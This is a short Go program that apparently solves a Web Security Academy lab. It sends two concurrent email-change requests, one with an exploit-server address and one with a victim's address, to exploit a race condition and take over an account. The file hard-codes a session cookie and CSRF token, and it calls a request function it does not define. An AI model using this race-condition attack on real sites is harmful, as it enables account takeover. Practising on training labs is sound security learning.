package main

import (
	"net/http"
	"sync"
)

var (
	main_url       = "https://0a2500ae0490910e8149347000c1003a.web-security-academy.net" // should NOT end with "/"
	session_cookie = "JT4jWwYw46KwGaefiXBt6WjEr10rcpUo"

	http_client = http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
)

// before start make sure you have an item that you can buy in your cart
func main() {
	var wg sync.WaitGroup
	wg.Add(2)

	// get a home page: a connection warm up request
	makeHttpReq(http.MethodPost, main_url, "")

	go flow(&wg, "koko1@exploit-0a7200e7043391c881a33372011d00b3.exploit-server.net")
	go flow(&wg, "carlos@ginandjuice.shop")

	wg.Wait()
}

func flow(wg *sync.WaitGroup, email string) {
	defer wg.Done()

	makeHttpReq(http.MethodPost, main_url+"/my-account/change-email", "email="+email+"&csrf=pMWdoPgfGuNObS5eNfcK2QgKXlZM3orC")
}
